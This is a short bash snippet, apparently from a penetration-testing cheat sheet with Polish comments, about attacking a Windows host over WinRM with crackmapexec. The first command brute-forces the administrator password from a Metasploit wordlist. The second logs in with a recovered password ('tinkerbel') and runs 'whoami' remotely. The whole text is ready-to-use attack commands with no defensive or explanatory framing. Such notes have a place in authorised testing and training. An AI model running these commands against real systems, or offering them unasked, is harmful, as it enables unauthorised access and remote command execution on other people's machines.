```bash
# Bruteforce 
$ crackmapexec winrm <IP> -u administrator -p /usr/share/wordlist/metasploit/common_passwords.txt
# logowanie jako użytkownik 
$ crackmapexec winrm <IP> -u administrator -p tinkerbel -x "whoami"
```